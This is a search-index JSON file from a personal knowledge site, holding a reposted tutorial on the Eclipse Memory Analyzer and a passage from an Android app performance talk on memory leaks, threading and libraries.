{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u5fae\u7ad9 \u6b22\u8fce\u4f7f\u7528\u5fae\u7ad9,\u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u7528\u5230\u7684\u77e5\u8bc6 \u6b22\u8fce\u6765\u5230 \u5fae\u7ad9 \u3002 \u5fae\u7ad9 \u6d89\u53ca\u4f17\u591a\u9886\u57df\uff0c\u5185\u5bb9\u7e41\u6742\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5f00\u53d1\u6280\u672f\u7684\u53d1\u5c55\u901f\u5ea6\u8d8a\u6765\u8d8a\u5feb\uff0c\u4f18\u8d28\u535a\u5ba2\u7684\u83b7\u53d6\u9700\u8981\u8017\u8d39\u5927\u91cf\u7cbe\u529b\uff0c\u800c\u540c\u65f6\u72ec\u7acb\u535a\u5ba2\u5173\u7ad9\u7684\u6bd4\u4f8b\u8d8a\u6765\u8d8a\u9ad8\u3002 \u4e3a\u4e86\u4f7f\u5f97\u66f4\u597d\u5730\u805a\u7126 \u5de5\u4f5c \uff0c2022\u5e74 3 \u6708\u4efd\uff0c \u5fae\u7ad9 \u5728 Github \u6709\u4e86\u7b2c\u4e00\u6b21 commit\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u5c01\u95ed\u7684\u7ad9\u70b9\uff0c\u56f4\u7ed5 \u7231\u597d \u4e0e \u5de5\u4f5c \uff0c \u5fae\u7ad9 \u5bf9\u5404\u4e2a\u65b9\u5411\u7684\u77e5\u8bc6\u548c\u6280\u672f\u8fdb\u884c\u6574\u7406\uff0c\u4ee5\u4fbf\u4e8e\u81ea\u5df1\u66f4\u597d\u5730\u805a\u7126 \u5de5\u4f5c \u76f8\u5173\u7684\u77e5\u8bc6\u3002","title":"\u5fae\u7ad9"},{"location":"#_1","text":"\u6b22\u8fce\u4f7f\u7528\u5fae\u7ad9,\u8ba1\u5212\u5728\u6b64\u8bb0\u5f55\u7528\u5230\u7684\u77e5\u8bc6 \u6b22\u8fce\u6765\u5230 \u5fae\u7ad9 \u3002 \u5fae\u7ad9 \u6d89\u53ca\u4f17\u591a\u9886\u57df\uff0c\u5185\u5bb9\u7e41\u6742\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5f00\u53d1\u6280\u672f\u7684\u53d1\u5c55\u901f\u5ea6\u8d8a\u6765\u8d8a\u5feb\uff0c\u4f18\u8d28\u535a\u5ba2\u7684\u83b7\u53d6\u9700\u8981\u8017\u8d39\u5927\u91cf\u7cbe\u529b\uff0c\u800c\u540c\u65f6\u72ec\u7acb\u535a\u5ba2\u5173\u7ad9\u7684\u6bd4\u4f8b\u8d8a\u6765\u8d8a\u9ad8\u3002 \u4e3a\u4e86\u4f7f\u5f97\u66f4\u597d\u5730\u805a\u7126 \u5de5\u4f5c \uff0c2022\u5e74 3 \u6708\u4efd\uff0c \u5fae\u7ad9 \u5728 Github \u6709\u4e86\u7b2c\u4e00\u6b21 commit\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u5c01\u95ed\u7684\u7ad9\u70b9\uff0c\u56f4\u7ed5 \u7231\u597d \u4e0e \u5de5\u4f5c \uff0c \u5fae\u7ad9 \u5bf9\u5404\u4e2a\u65b9\u5411\u7684\u77e5\u8bc6\u548c\u6280\u672f\u8fdb\u884c\u6574\u7406\uff0c\u4ee5\u4fbf\u4e8e\u81ea\u5df1\u66f4\u597d\u5730\u805a\u7126 \u5de5\u4f5c \u76f8\u5173\u7684\u77e5\u8bc6\u3002","title":"\u5fae\u7ad9"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/","text":"10 Tips for using the Eclipse Memory Analyzer Analyzing and understanding the memory use of an application is challenging. A subtle logic error can result in listeners never being disposed, ultimately leading to the dreaded OutOfMemory error . Even if your application is properly disposing of all unused objects, it may still be requiring 10 or 100 times more memory than necessary. Lucky for us, the Eclipse Memory Analyzer ( MAT ) can help provide details of an application\u2019s memory use. The tool is useful for both tracking memory leaks and for periodically reviewing the state of your system. In this tutorial I\u2019ll outline 10 tips to help you use the MAT more effectively. If you\u2019re a Java developer, the Eclipse Memory Analyzer Tool should certainly be in your debugging toolbox . [ Looking for more useful tools? See our Eclipse Tools page. | Managing your Eclipse workspace is easier with Yoxos . Create a free profile now . ] The Memory Analyzer can be installed using the Install New Software dialog or through the Eclipse MarketPlace Client . You can also include it in your own custom Eclipse install using Yoxos . In this example, we are using a very simple program that allocates 100,000 Listeners, and stores them in 4 different lists. The application then sleeps without removing or clearing these lists. 1. Acquiring a memory snapshot (Heap Dump) There are several ways you can get started with MAT. You can: Configure an application to dump the contents of its memory when an out of memory error occurs, Connect the MAT to an existing java process, or Manually acquire a heap dump and load it into the MAT In all cases it\u2019s important to keep in mind that this is a snapshot of memory at a point in time . The MAT cannot tell you why an object was created, nor can it show you objects that have already been garbage collected. However, if you use the MAT alongside other debugging tools and techniques , you can often conquer memory leaks pretty quickly. To configure your application to produce a heap dump whenever an OutOfMemory Error is thrown, add the following vm argument: -XX:+HeapDumpOnOutOfMemoryError Alternatively, you can use jstack to acquire a Heap dump from a currently running java process. jmap -dump:file=heap.bin <pid> Finally, you can use the MAT\u2019s Acquire Heap Dump action to choose an existing Java process on your local machine. ] When you load a Heap dump for the first time, the MAT will index it. This make take a few minutes, but the results will be persisted so subsequent loads will be quick. 2. Understanding the Histogram When you first acquire your heap dump, the MAT will show you an overview of the applications memory use. ] The pie chart in the middle shows you the biggest objects by retained size. That means if we could dispose a particular instance of java.lang.Thread we would save 11.2Mb, and over 90% of the memory used in this application. While that might look interesting, java.lang.Thread is unlikely the real problem here. To get a better sense of what objects currently exist, you can use the Histogram . ] The histogram shows the number of instances of a particular class and how much memory each one uses. Of course, char[], String and Object[] are unlikely the problem. To help better organize this view, you can group by classloader or package. This will allow you to focus on your Objects. ] The histogram can also be filtered using a regular expression. For example, we can show only classes that match the pattern com.example.mat. * ] With this view, we can now start to see that 100,000 Listener Objects are alive in the system. We can also see the amount of memory each Object is using. There are two calculations, Shallow Heap and Retained Heap. Shallow heap is the amount of memory consumed by one object. An Object requires 32 (or 64 bits, depending on the architecture) for each reference. Primitives such as integers and longs require 4 or 8 bytes, etc\u2026 While this can be interesting, the more useful metric is the Retained Heap. 3. Understanding the Retained Heap The retained heap shows the sum of the shallow heap size of all objects that would be removed when this object is garbage collected. For example, if an ArrayList held 100,000 items, and each item required 16 bytes, then removing the ArrayList would free 16 x 100,000 + X, where X is the shallow size of the ArrayList. ( Note: this assumes that these objects are only being referenced by the ArrayList, and not elsewhere). The retained heap is computed by adding the size all the objects in the retained set. A retained set of X is the set of objects which would be removed by the GC when X is collected. The retained heap can be calculated in two different ways, using the quick approximation or the precise retained size. ] ] By calculating the Retained Heap we can now see that com.example.mat.Controller is holding the majority of the memory, even though it\u2019s only 24 bytes itself. By finding a way to free up the Controller, we can certainly get our memory problem under control. 4. The Dominator Tree The key to understanding your retained heap, is looking at the dominator tree. The dominator tree is a tree produced by the complex object graph in your system. The dominator tree allows you to identify the largest memory graphs. An Object X is said to dominate an Object Y if every path from the Root to Y must pass through X . Looking at the dominator tree for our example, we can start to see where the bulk of our memory is leaking. ] By looking at the dominator tree, we can easily see that it\u2019s not the java.lang.Thread that\u2019s the problem, but rather the Controller and the Allocator that hold the memory. All 100,000 Listeners are being retained by the Controller. By either removing freeing these objects, or freeing the lists that they contain, we can likely improve our situation. There are a few useful properties of the dominator tree: All Objects that belongs to a subtree of X (com.example.mat.Controller in this case) are said to be in the retained set of X If X is the immediate dominator of Y (Controller is the immediate dominator of the Allocator), then the immediate dominator of X (which is java.lang.Thread in our example) also dominates Y. The parent child relationship in the tree do not necessarily correspond to the relationships in the Object graph From the Histogram you can also choose a particular class and find all the objects that dominate the instances of this class. ] 5. Exploring Paths to the GC Roots Sometimes you have a large collection of Objects that you\u2019re certain your disposing of. Finding the the dominator may help, but often you want the exact path from that Object to the roots. For example, if I now properly dispose of my Controller, then certainly my memory problem should go away, unfortunately they didn\u2019t . If I now choose an instance of the Listener, and look at Paths To GC Roots, I can see that the Controller class ( Note: the class, not an Object) reference to a list of Listeners. This is because one of the list was declared static . ] You can also explore all the incoming and outgoing references to an Object. This is very useful if you want to see all the references to a particular Object in the Object graph. 6. The \u2018Inspector\u2019 The Inspector provides detailed information about the currently selected Class or Object. In this example we can see that the currently selected ArrayList contains 100,000 elements and references an object array at memory location 0x7f354ea68. ] Keeping the Inspector and the Snapshot linked will provide you with important statistics about all your selections. 7. Common Memory Anti-Patterns The MAT provides reports for common memory use anti-patterns. These can be used to get an idea of where memory leaks are occurring, or by looking for some low hanging fruit which can be cleaned up to help improve performance. ] The Heap Dump Overview will show you detailed information about your Heap Dump and provide links to common tools (like the Histogram). Information such as the threads which were running, total number of Objects in the system, size of the heap, and are also shown. ] The Leak Suspects report displays possible memory leaks, and provides links to the tools and charts to analyze these findings. ] Another common anti-pattern is the use of a large number of collections, with very few entries in each one. For example, if our listeners each had an array of notifiers (items that need to be notified of certain events), but these notifiers were only used occasionally, we would end up wasting a lot of space. The Java Collections tools can help with these problems. ] ] ] By running a Collection -> Fill Ratio Report we can see that there are 100,000 ArrayLists that are empty. If were allocated these in a lazy manner (only when needed), we would save almost 8Mb. We can also use Collection Analysis to see array fill ratios , collection size statistics and map collision ratios . 8. Java Tools The MAT has a number of built in tools to generate reports tailored to the details of the Java runtime. For example, the Threads and Stacks report will show details about all the treads in the system. You can see the local variables which are currently kept alive on each stack. ] You can Find all the Strings in the system that match a particular pattern: ] Or even find Strings in the system which contain wasted space in their character arrays (often due to repeated use of substring). ] 9. Object Query Language As we\u2019ve shown, the Eclipse Memory Analyzer has a lot of tools to help track both memory leaks and excessive memory use. While most memory problems can likely be addressed using the techniques described above, a Heap Dump contains much more information. The Object Query Language (OQL) allows you to build your own reports based on the results of a Heap Dump. The OQL is an SQL-like language. Just think of Classes as tables, Objects as rows and Fields as columns. For example. to show all Objects of type com.example.mat.Listener, you would simply write: select * from com.example.mat.Listener ] Columns can be configured using different fields, such as: SELECT toString(l.message), l.message.count FROM com.example.mat.Listener l ] And finally, the WHERE clause can be used to specify particular criteria, such as all the Strings in the system which are not of the format \u201cmessage:.*\u201d SELECT toString(s), s.count FROM java.lang.String s WHERE (toString(s) NOT LIKE \"message.*\") ] 10. Exporting your results The memory analyzer is a great tool for creating reports about the state of an application\u2019s memory. A Heap Dump contains valuable information about the state of your system, and the MAT provides the tools needed to access this data. However, like with many open tools, if something is missing you\u2019re not locked in, nor are you out of luck. With the MAT you can export your results to several different formats including HTML, CSV or even Plain Text. You can then use your favorite spreadsheet program (or your own tool) to continue your analysis. ] The Eclipse Memory Analyzer is a powerful tool, one all Java Developers should be familiar with. Tracking memory leaks and other memory related problems is often challenging, but hopefully with the MAT you can get to the root of your problems relatively quickly. \u539f\u6587\u94fe\u63a5\uff1a https://eclipsesource.com/blogs/2013/01/21/10-tips-for-using-the-eclipse-memory-analyzer/","title":"10 Tips for using the Eclipse Memory Analyzer"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#10-tips-for-using-the-eclipse-memory-analyzer","text":"Analyzing and understanding the memory use of an application is challenging. A subtle logic error can result in listeners never being disposed, ultimately leading to the dreaded OutOfMemory error . Even if your application is properly disposing of all unused objects, it may still be requiring 10 or 100 times more memory than necessary. Lucky for us, the Eclipse Memory Analyzer ( MAT ) can help provide details of an application\u2019s memory use. The tool is useful for both tracking memory leaks and for periodically reviewing the state of your system. In this tutorial I\u2019ll outline 10 tips to help you use the MAT more effectively. If you\u2019re a Java developer, the Eclipse Memory Analyzer Tool should certainly be in your debugging toolbox . [ Looking for more useful tools? See our Eclipse Tools page. | Managing your Eclipse workspace is easier with Yoxos . Create a free profile now . ] The Memory Analyzer can be installed using the Install New Software dialog or through the Eclipse MarketPlace Client . You can also include it in your own custom Eclipse install using Yoxos . In this example, we are using a very simple program that allocates 100,000 Listeners, and stores them in 4 different lists. The application then sleeps without removing or clearing these lists.","title":"10 Tips for using the Eclipse Memory Analyzer"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#1-acquiring-a-memory-snapshot-heap-dump","text":"There are several ways you can get started with MAT. You can: Configure an application to dump the contents of its memory when an out of memory error occurs, Connect the MAT to an existing java process, or Manually acquire a heap dump and load it into the MAT In all cases it\u2019s important to keep in mind that this is a snapshot of memory at a point in time . The MAT cannot tell you why an object was created, nor can it show you objects that have already been garbage collected. However, if you use the MAT alongside other debugging tools and techniques , you can often conquer memory leaks pretty quickly. To configure your application to produce a heap dump whenever an OutOfMemory Error is thrown, add the following vm argument: -XX:+HeapDumpOnOutOfMemoryError Alternatively, you can use jstack to acquire a Heap dump from a currently running java process. jmap -dump:file=heap.bin <pid> Finally, you can use the MAT\u2019s Acquire Heap Dump action to choose an existing Java process on your local machine. ] When you load a Heap dump for the first time, the MAT will index it. This make take a few minutes, but the results will be persisted so subsequent loads will be quick.","title":"1. Acquiring a memory snapshot (Heap Dump)"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#2-understanding-the-histogram","text":"When you first acquire your heap dump, the MAT will show you an overview of the applications memory use. ] The pie chart in the middle shows you the biggest objects by retained size. That means if we could dispose a particular instance of java.lang.Thread we would save 11.2Mb, and over 90% of the memory used in this application. While that might look interesting, java.lang.Thread is unlikely the real problem here. To get a better sense of what objects currently exist, you can use the Histogram . ] The histogram shows the number of instances of a particular class and how much memory each one uses. Of course, char[], String and Object[] are unlikely the problem. To help better organize this view, you can group by classloader or package. This will allow you to focus on your Objects. ] The histogram can also be filtered using a regular expression. For example, we can show only classes that match the pattern com.example.mat. * ] With this view, we can now start to see that 100,000 Listener Objects are alive in the system. We can also see the amount of memory each Object is using. There are two calculations, Shallow Heap and Retained Heap. Shallow heap is the amount of memory consumed by one object. An Object requires 32 (or 64 bits, depending on the architecture) for each reference. Primitives such as integers and longs require 4 or 8 bytes, etc\u2026 While this can be interesting, the more useful metric is the Retained Heap.","title":"2. Understanding the Histogram"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#3-understanding-the-retained-heap","text":"The retained heap shows the sum of the shallow heap size of all objects that would be removed when this object is garbage collected. For example, if an ArrayList held 100,000 items, and each item required 16 bytes, then removing the ArrayList would free 16 x 100,000 + X, where X is the shallow size of the ArrayList. ( Note: this assumes that these objects are only being referenced by the ArrayList, and not elsewhere). The retained heap is computed by adding the size all the objects in the retained set. A retained set of X is the set of objects which would be removed by the GC when X is collected. The retained heap can be calculated in two different ways, using the quick approximation or the precise retained size. ] ] By calculating the Retained Heap we can now see that com.example.mat.Controller is holding the majority of the memory, even though it\u2019s only 24 bytes itself. By finding a way to free up the Controller, we can certainly get our memory problem under control.","title":"3. Understanding the Retained Heap"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#4-the-dominator-tree","text":"The key to understanding your retained heap, is looking at the dominator tree. The dominator tree is a tree produced by the complex object graph in your system. The dominator tree allows you to identify the largest memory graphs. An Object X is said to dominate an Object Y if every path from the Root to Y must pass through X . Looking at the dominator tree for our example, we can start to see where the bulk of our memory is leaking. ] By looking at the dominator tree, we can easily see that it\u2019s not the java.lang.Thread that\u2019s the problem, but rather the Controller and the Allocator that hold the memory. All 100,000 Listeners are being retained by the Controller. By either removing freeing these objects, or freeing the lists that they contain, we can likely improve our situation. There are a few useful properties of the dominator tree: All Objects that belongs to a subtree of X (com.example.mat.Controller in this case) are said to be in the retained set of X If X is the immediate dominator of Y (Controller is the immediate dominator of the Allocator), then the immediate dominator of X (which is java.lang.Thread in our example) also dominates Y. The parent child relationship in the tree do not necessarily correspond to the relationships in the Object graph From the Histogram you can also choose a particular class and find all the objects that dominate the instances of this class. ]","title":"4. The Dominator Tree"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#5-exploring-paths-to-the-gc-roots","text":"Sometimes you have a large collection of Objects that you\u2019re certain your disposing of. Finding the the dominator may help, but often you want the exact path from that Object to the roots. For example, if I now properly dispose of my Controller, then certainly my memory problem should go away, unfortunately they didn\u2019t . If I now choose an instance of the Listener, and look at Paths To GC Roots, I can see that the Controller class ( Note: the class, not an Object) reference to a list of Listeners. This is because one of the list was declared static . ] You can also explore all the incoming and outgoing references to an Object. This is very useful if you want to see all the references to a particular Object in the Object graph.","title":"5. Exploring Paths to the GC Roots"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#6-the-inspector","text":"The Inspector provides detailed information about the currently selected Class or Object. In this example we can see that the currently selected ArrayList contains 100,000 elements and references an object array at memory location 0x7f354ea68. ] Keeping the Inspector and the Snapshot linked will provide you with important statistics about all your selections.","title":"6. The \u2018Inspector\u2019"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#7-common-memory-anti-patterns","text":"The MAT provides reports for common memory use anti-patterns. These can be used to get an idea of where memory leaks are occurring, or by looking for some low hanging fruit which can be cleaned up to help improve performance. ] The Heap Dump Overview will show you detailed information about your Heap Dump and provide links to common tools (like the Histogram). Information such as the threads which were running, total number of Objects in the system, size of the heap, and are also shown. ] The Leak Suspects report displays possible memory leaks, and provides links to the tools and charts to analyze these findings. ] Another common anti-pattern is the use of a large number of collections, with very few entries in each one. For example, if our listeners each had an array of notifiers (items that need to be notified of certain events), but these notifiers were only used occasionally, we would end up wasting a lot of space. The Java Collections tools can help with these problems. ] ] ] By running a Collection -> Fill Ratio Report we can see that there are 100,000 ArrayLists that are empty. If were allocated these in a lazy manner (only when needed), we would save almost 8Mb. We can also use Collection Analysis to see array fill ratios , collection size statistics and map collision ratios .","title":"7. Common Memory Anti-Patterns"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#8-java-tools","text":"The MAT has a number of built in tools to generate reports tailored to the details of the Java runtime. For example, the Threads and Stacks report will show details about all the treads in the system. You can see the local variables which are currently kept alive on each stack. ] You can Find all the Strings in the system that match a particular pattern: ] Or even find Strings in the system which contain wasted space in their character arrays (often due to repeated use of substring). ]","title":"8. Java Tools"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#9-object-query-language","text":"As we\u2019ve shown, the Eclipse Memory Analyzer has a lot of tools to help track both memory leaks and excessive memory use. While most memory problems can likely be addressed using the techniques described above, a Heap Dump contains much more information. The Object Query Language (OQL) allows you to build your own reports based on the results of a Heap Dump. The OQL is an SQL-like language. Just think of Classes as tables, Objects as rows and Fields as columns. For example. to show all Objects of type com.example.mat.Listener, you would simply write: select * from com.example.mat.Listener ] Columns can be configured using different fields, such as: SELECT toString(l.message), l.message.count FROM com.example.mat.Listener l ] And finally, the WHERE clause can be used to specify particular criteria, such as all the Strings in the system which are not of the format \u201cmessage:.*\u201d SELECT toString(s), s.count FROM java.lang.String s WHERE (toString(s) NOT LIKE \"message.*\") ]","title":"9. Object Query Language"},{"location":"Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/#10-exporting-your-results","text":"The memory analyzer is a great tool for creating reports about the state of an application\u2019s memory. A Heap Dump contains valuable information about the state of your system, and the MAT provides the tools needed to access this data. However, like with many open tools, if something is missing you\u2019re not locked in, nor are you out of luck. With the MAT you can export your results to several different formats including HTML, CSV or even Plain Text. You can then use your favorite spreadsheet program (or your own tool) to continue your analysis. ] The Eclipse Memory Analyzer is a powerful tool, one all Java Developers should be familiar with. Tracking memory leaks and other memory related problems is often challenging, but hopefully with the MAT you can get to the root of your problems relatively quickly. \u539f\u6587\u94fe\u63a5\uff1a https://eclipsesource.com/blogs/2013/01/21/10-tips-for-using-the-eclipse-memory-analyzer/","title":"10. Exporting your results"},{"location":"Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/","text":"10 Ways to Improve Your Android App's Performance Everyone knows how important performance is for the success of an app, but how do you get your app running at peak performance? In his talk at DroidCon NYC 2015, Boris Farber brings his wealth of experience working with Android APIs at Google to help you avoid ten common pitfalls and keep your app running as fast as humanly possible. Learn how to avoid falling victim to long launch times and bad scrolling, in order to create a responsive app with a smoother user experience. Save the date for Droidcon SF in March \u2014 a conference with best-in-class presentations from leaders in all parts of the Android ecosystem. Introduction (0:00) Hi, my name is Boris; I am a Developer Advocate at Google, and I\u2019m focusing on performance-heavy apps. This post is the best practices and the mistakes I have seen while consulting partners on their Android apps. If you have a small app, read on, but you will likely only need this information when your app gets larger. The rules of thumb that I have found from working with data intensive Android apps. Usually, the app that I am looking at has a long launch time, janky scrolling, or even in the worst case, unresponsiveness. We are going to see a bunch of ways how can we make those things better and faster because, at the end of the day, we all want to be successful. Activity Leaks (1:17) Our first friend in things that we need to fix is Activity leaks, and let\u2019s see how they happen. Activity leaks, or memory leaks in general, are extremely dangerous. Why do they happen? If we hold the reference in our code to an unused Activity, we hold all of the Activity\u2019s layout and, in turn, all of its views. That results in many, many pixels you don\u2019t want to store in memory. Another really problematic thing is keeping static references. Don\u2019t forget, both Activities and fragments have a life cycle. Once we have a static reference, this Activity, or fragment, will not be garbage collected. This is why static references are dangerous, they become dangling pointers. m_staticActivity = staticFragment.getActivity() I have seen this code too many times, unfortunately, and on one occasion it took two weeks of my life to understand why the app was crashing at unexpected times. Not my favorite activity to run after those bugs. I hope it is not yours. We start with the first, easiest way to make a memory leak, which is by leaking listeners. Say we have the following code, public class LeakActivity extends Activity and guess what? We have some NastyManager , which is unfortunately a singleton, and we add activity to this manager by addListener(this) . public class LeakActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); NastyManager.getInstance().addListener(this); } } If you want to see more details in the blog post that I posted in Android Developers, maybe three, four weeks ago, what happens is NastyManager holds our Activity. So, the Activity might not be presented, but it will be in memory, and this is a really, really bad idea. Let me show you how to fix it pretty easily. @Override public void onDestroy() { super.onDestroy(); NastyManager.getInstance().removeListener(this); } onDestroy , for our Activity, we just unregister ourselves. Of course, we have a better discussion, should we use singletons in the first place? Usually, we shouldn\u2019t, but sometimes it\u2019s the only solution. That\u2019s why software engineering is interesting. We have a tradeoff, and we have a design. So please, don\u2019t forget to remove your listeners. In order for us deeper to understand why these problems happen, you need to remember the structure. What does it mean to be an inner class? We have a Handler, which we\u2019ll look at shortly, which is an inner non-static class, to the scoping class, which is Activity. As we are going to see shortly, as long as Handler alive, the bounding Activity is alive. If you don\u2019t believe me, try to read the JVM spec, this is funny. Here is another memory leak. To represent the example, we have a Activity, and inside we have a Handler. public class MainActivity extends Activity { //... Handler handler; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); //... handler = new Handler() { @Override public void handleMessage(Message msg) { } } } Excellent way to communicate things. Handler, asynchronous communication, thread-safe, all good things. What happens if you have the following code? handler.postDelayed next hour. What does it mean? It means, as long as a Handler has a message, it\u2019s alive. And if a Handler is alive, it\u2019s enclosing Activity is alive, even though we might not need it but we pay for the memory. This is what we call a memory leak. Let\u2019s see how we fix it. I have a confession to make, the fix is a little bit tricky. We really recommend using WeakReference . What\u2019s a WeakReference ? WeakReference , if it\u2019s the only reference to underlying object, the garbage collector will clean it. That\u2019s it \u2013 truly simple. Here, We declare a Handler with a WeakReference , so if the Handler is alive and we don\u2019t need Activity, and the WeakReference that the Handler holds is the only reference. The Activity is cleaned. I admit this fix is a little bit tricky. This is the ecosystem that we are living in. private static class MyHandler extends Handler { private final WeakReference<MainActivity> mActivity; // ... public MyHandler(MainActivity activity) { mActivity = new WeakReference<MainActivity>(activity); //... } @Override public void handleMessage(Message msg) { } //... } To recap, we have an inner class, like Handler. Inner non-static class can\u2019t live in isolation from the scoping class, which is Activity. So please, when you come back to your code, take a look at all your inner classes and make sure that you don\u2019t have a memory leak there. You and your users will thank you later. In general, please prefer static to non-static inner classes. Basically the difference is non-static inner class is not bounded to its enclosing class, such as Activity. Note that both classes, Handler and Activity, have a different lifetime. This is one of the reasons for the most, most annoying bugs that I see. Most of the time I am trying to make you all successful on Android, but I also work with companies trying to sort out their problems, and many of them come to me with memory leaks. What Can You Do About Activity Leaks? (8:37) Please remove away static references. Consider using event bus to decoup our listeners from senders. Please unregister your listeners. Please prefer static inner classes to non-static ones. Please do code reviews. Based on my personal experience, the code reviews are so far the most effective way to find memory leaks. Understand your application structure. Use tools such as MAT, Eclipse Analyzer, LeakCanary. Print logs on callbacks. Scrolling (10:05) The secret for effective scrolling is as follows: use UI thread only for UI. This alone would solve 99% of your problems. Never do the following on UI thread: Never load images. Never do networking calls. Never parse JSON. Never access databases. There are means to do them. Some of them even fast. For images, networking, JSON, use libraries. There are a lot of community solutions, and some of the best presenters are even presenting in this Droidcon conference. For database access, consider using Loader, who actually do batch updates to databases, and to make you focus on what\u2019s important in your app. Images (11:26) As far as image libraries go, the following typically provide the required functionality, based on our experience working with leading companies: Glide , Picasso , Fresco . Just know that they have all different design trade-offs, especially around the large images count. Memory (12:13) We managed to convince ourselves that the bitmaps are tricky, basically because of their large size and fragmented heap. When I was responsible for an app with a lot of images on the pre-4.0 devices, that made life hard. Also, memory management is tricky. Some of the stuff, it\u2019s better to put in file, and some of the stuff it\u2019s better to keep in memory. Please note, we have the class LRUCache which is an efficient cache implementation. Networking (12:54) First, the problem with Java networking, which made its way into Android, is the tricky APIs. In case you don\u2019t know, many java.net API calls are blocking. This is another excellent reason to not do networking on the UI thread. Remember that stream calls are blocking, and to make things even more interesting, equals of the URL class result in DNS call \u2013 this is time that you are paying. Use libraries, or any other threading solution that fits to your program. The hard part about the networking is they\u2019re doing Async Http. If I remember correctly from Android 4.4, OkHttp is the part of a Android sources, however, if you feel that you need the latest version of OkHttp with some stuff that hasn\u2019t made its way into the official Android, consider bundling your own. There is another public library which is made by Google, Volley . There is a excellent library made by Square called Retrofit for your REST calls, all the solutions you have to make your app network-friendly successful. Large JSON (14:35) This is another component of things you shouldn\u2019t do on UI thread because parsing large JSON has a performance effect, especially if converted to a class with a lot of getters and setters. What we have found so far is if you have a small JSON, the GSON , also made by Google, gives the best result.However, I consider a rule of thumb, maybe less than 500k could be small, anything larger could be considered as large. And also, don\u2019t forget, this is a moving target. On a strong device such as Nexus 6, something we consider as large is small, but if your app has to support previous devices you should take it with a grain of salt. For large JSON, I would say the best to use or the fastest to use are Jackson and Instagram JSON Parser . They did really interesting work of generating the stream parser code. From company feedback, ig-json-parser gives the best results so far. Looper.myLooper() == Looper.getMainLooper() is the code you can use to make sure you are not on the UI thread. What can we do to speed up our scrolling? (16:56) Please keep UI thread only for UI. Understand concurrency APIs. Please use libraries. Use Loaders The reason to use libraries is because the code is tricky. That doesn\u2019t mean you can\u2019t write a good library by yourself, however, if I were to choose should I focus on something which exists whether, say, providing more value to my business, I will definitely go for providing more value to the business. Developing a library is something which is expensive, and if you have libraries right off the shelf, consider using them. They are supported, maintained and have a community behind them. Concurrency APIs (18:00) I find these really important to understand in order to make your app fast and responsive. People including myself unfortunately forget that Service methods run on UI thread. Please consider using IntentService , AsyncTask , Executors , Handlers and Loopers . Let\u2019s focus on the trade-offs of the first three. IntentService (19:07) In my previous company, I used the IntentService to perform uploading to the server. IntentService is a single-threaded, simple, one job at a time. We don\u2019t have any job system, meaning we can\u2019t keep track for jobs, and we have essentially no normal way to stop it. If you have some large operation that doesn\u2019t touch UI, consider using it. What I did in my previous company was doing upload to one IntentService and showing a notification icon once I\u2019m done. AsyncTask (19:56) The AsyncTask is a solution if you have a thing that you need, or basically something that you don\u2019t care about the result of outside the UI. However, please note that even though AsyncTask is relatively easy, it has some dark corners. Activity life-cycles, especially during rotation, need to be closed and dismissed. Otherwise it could cause memory leaks, and as we have seen on our first bullet, Activity memory leaks are not fun. Another thing that I have problems with is it was changed rapidly around the Honeycomb and Gingerbread. As a result, I forked the AsyncTask sources from the Android source tray, bundled it in my APK, and that\u2019s it. Sometimes, this could be solution. Executor Framework (21:11) This is another friend in the concurrency APIs that we got from Java 6 and on, this is essentially a thread pool managed by the system, which has callbacks, futures and mostly I use it for MapReduce tasks. Meaning, if you have a big job and you want to break it into small pieces and give each piece a thread, the Executor Framework could be your best solution. For instance, I used it when I wrote my open source git project three or four years ago. Even though it was developed on Nexus S, in the dark ages, when we ran it on Nexus 6, it performed extremely well. What can you do about concurrency APIs? (22:07) Please learn and understand the APIs and tradeoffs. Please make sure that you map the correct solution to the right problem. Understand what your problems are and see, which of the API that I presented before, can defeat the best. Please refactor your code Deprecation (22:42) We all know what deprecation is and why we should avoid it. Not only is deprecation bad, system abuse is bad. Here are some classic examples: Please don\u2019t call private APIs by reflection. Please don\u2019t call private native methods from the NDK and C level. Please don\u2019t just Runtime.exec to communicate with processes. adb shell am to communicate with other processes is not something we want to support. I have seen zillions of bugs, especially when we introduced Android L, when we blocked this feature. Abusing private APIs, which are meant to be private, is bound to lead to failure. Deprecation means that some API will be removed and, usually one or two days before the major release, your app will not work. To make things even worse, sometimes if you are dependent on the old version of a library, there is no way to update both APIs and tools. Unfortunately, I saw a company whose whole application was dependent on a library that could only be built with Android 3.0. Android 3.0 was a long, long, long time ago. This is a bad thing. Please don\u2019t do it. Most of the time there is a compelling reason for us to deprecate APIs to improve security, correctness, and of course, performance. To avoid issues with deprecations: Know and use proper APIs. Refactor your dependencies. Don\u2019t abuse the system. Update your dependencies and tools. Newer is better. Prefer Toolbar to ActionBar, and prefer RecyclerView, especially for animations, because it\u2019s optimized for that. As a latest and greatest example, if you don\u2019t know, but we removed the Apache Http connection at M. By the way, it\u2019s still available as a gradle dependency. Please use HttpURLConnection. It has a simpler API, smaller size, transparent compression, better response caching, and other cool things. Architecture (27:03) Bugs around a lifecycle in architecture 